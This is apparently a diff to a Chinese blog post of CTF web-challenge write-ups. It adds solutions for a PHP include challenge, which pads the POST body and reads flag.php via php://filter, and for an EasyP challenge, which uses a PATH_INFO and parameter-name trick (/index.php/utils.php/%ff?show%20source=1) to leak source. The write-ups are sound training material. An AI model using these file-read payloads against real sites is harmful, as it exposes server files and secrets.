@@ -4,7 +4,7 @@ image: '/images/133301699_p0_master1200.jpg'
 pinned: false
 comment: true
 published: 2025-11-11
-updated: 2026-04-16
+updated: 2026-04-18
 description: "刷题"
 category: 刷题
 tags: [刷题]
@@ -1220,7 +1220,7 @@ if(isset($a)&&(file_get_contents($a,'r')) === 'I want flag'){
 
 
 
-![image-20260416192732537](C:\Users\yu\AppData\Roaming\Typora\typora-user-images\image-20260416192732537.png)
+![image-20260416192732537](/images/image-20260416192732537.png)
 
 简单入门题，不讲不讲。
 
@@ -1232,7 +1232,7 @@ if(isset($a)&&(file_get_contents($a,'r')) === 'I want flag'){
 
 绕过 `__wakeup` 就行，利用一个漏洞。
 
-![image-20260416192901087](C:\Users\yu\AppData\Roaming\Typora\typora-user-images\image-20260416192901087.png)
+![image-20260416192901087](/images/image-20260416192901087.png)
 
 
 
@@ -1240,7 +1240,219 @@ if(isset($a)&&(file_get_contents($a,'r')) === 'I want flag'){
 
 
 
-# #18.
+# #18.[NSSCTF 2022 Spring Recruit]ezgame
+
+直接查js，已经写在里面了。
+
+
+
+---
+
+
+
+# #19.[鹏城杯 2022]简单包含
+
+```
+<?php 
+highlight_file(__FILE__);
+include($_POST["flag"]);
+//flag in /var/www/html/flag.php;
+```
+
+这是源码，其实正常就是直接利用php伪协议读取flag文件。
+
+但是直接读是没有回显的， 然后我闲着没事读取了一下index， 就看到了源码。
+
+```
+<?php
+
+$path = $_POST["flag"];
+
+if (strlen(file_get_contents('php://input')) < 800 && preg_match('/flag/', $path)) {
+    echo 'nssctf waf!';
+} else {
+    @include($path);
+}
+?>
+
+<code><span style="color: #000000">
+<span style="color: #0000BB">&lt;?php&nbsp;<br />highlight_file</span><span style="color: #007700">(</span><span style="color: #0000BB">__FILE__</span><span style="color: #007700">);<br />include(</span><span style="color: #0000BB">$_POST</span><span style="color: #007700">[</span><span style="color: #DD0000">"flag"</span><span style="color: #007700">]);<br /></span><span style="color: #FF8000">//flag&nbsp;in&nbsp;/var/www/html/flag.php;</span>
+</span>
+</code><br />
+```
+
+就看到了源码，就是有限制我们的post。
+
+首先是800的长度限制，第二就是路径匹配，只要有一个不是，就可以往下include执行。
+
+这便是我们可以读取到 `index.php` 的原因。
+
+之后我们利用垃圾流数据破坏第一个条件，然后读取flag，就可以得到flag。
+
+```
+a=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&flag=php://filter/read=convert.base64-encode/resource=/var/www/html/flag.php
+```
+
+
+
+---
+
+
+
+# #20.[鹤城杯 2021]EasyP
+
+```
+<?php
+include 'utils.php';
+
+if (isset($_POST['guess'])) {
+    $guess = (string) $_POST['guess'];
+    if ($guess === $secret) {
+        $message = 'Congratulations! The flag is: ' . $flag;
+    } else {
+        $message = 'Wrong. Try Again';
+    }
+}
+
+if (preg_match('/utils\.php\/*$/i', $_SERVER['PHP_SELF'])) {
+    exit("hacker :)");
+}
+
+if (preg_match('/show_source/', $_SERVER['REQUEST_URI'])){
+    exit("hacker :)");
+}
+
+if (isset($_GET['show_source'])) {
+    highlight_file(basename($_SERVER['PHP_SELF']));
+    exit();
+}else{
+    show_source(__FILE__);
+}
+?>
+```
+
+
+
+```
+$guess === $secret
+```
+
+强比较。
+
+
+
+```
+if (preg_match('/utils\.php\/*$/i', $_SERVER['PHP_SELF'])) {    exit("hacker :)"); } 
+```
+
+```
+if (preg_match('/show_source/', $_SERVER['REQUEST_URI'])){    exit("hacker :)"); } 
+```
+
+```
+if (isset($_GET['show_source'])) {    highlight_file(basename($_SERVER['PHP_SELF']));    exit(); } 
+```
+
+无法访问utils.php。
+
+不能出现show_source。
+
+如果 `isset($_GET['show_source'])` 成功，那么执行后面的 `basename` 。
+
+
+
+学习：
+
+```
+案例网址：https://www.shawroot.cc/php/index.php/test/foo?username=root
+$_SERVER['PHP_SELF'] 	得到：/php/index.php/test/foo
+$_SERVER['REQUEST_URI'] 得到：/php/index.php/test/foo?username=root
+```
+
+```
+$_SERVER['REQUEST_URI']不会将参数中的特殊符号进行转换，
+也就是说它获取到的url上面的值，不会进行url解码
+```
+
+`basename()`函数：返回路径中的文件名部分。
+
+
+
+所以：
+
+```
+?show%20source=1 
+```
+
+正则 /show_source/ 匹配不到，因为原始 URI 里没有 show_source。
+
+但 PHP 在解析 GET 参数名时，会把空格转成下划线，所以：
+
+```
+show%20source 
+```
+
+最终会被识别成：
+
+```
+$_GET['show_source'] 
+```
+
+这样就成功进入：
+
+```
+highlight_file(...) 
+```
+
+
+
+构造路径：
+
+```
+/index.php/utils.php/%ff 
+```
+
+$_SERVER['PHP_SELF'] 不再是以 utils.php 结尾，因为后面还有 /%ff，所以绕过：
+
+```
+preg_match('/utils\.php\/*$/i', $_SERVER['PHP_SELF']) 
+```
+
+basename($_SERVER['PHP_SELF']) 就可以返回文件 utils.php
+
+于是完整 payload 就是：
+
+```
+/index.php/utils.php/%ff?show%20source=1 
+```
+
+
+
+---
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 
 
